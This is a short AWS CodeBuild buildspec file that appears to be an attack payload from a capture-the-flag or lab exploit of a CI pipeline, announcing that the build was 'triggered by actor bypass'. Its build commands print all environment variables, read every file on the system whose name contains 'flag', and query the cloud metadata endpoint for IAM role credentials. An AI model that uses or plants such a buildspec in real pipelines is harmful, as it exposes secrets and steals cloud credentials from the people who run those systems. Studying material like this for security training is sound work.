version: 0.2
phases:
  build:
    commands:
      - echo "!!! BUILD TRIGGERED BY ACTOR BYPASS !!!"
      - echo "=== ENVIRONMENT ==="
      - env | sort
      - echo "=== SEARCHING FOR FLAG ==="
      - find / -name "*flag*" -type f 2>/dev/null -exec cat {} + || true
      - echo "=== IAM ROLE CHECK (if any) ==="
      - curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true
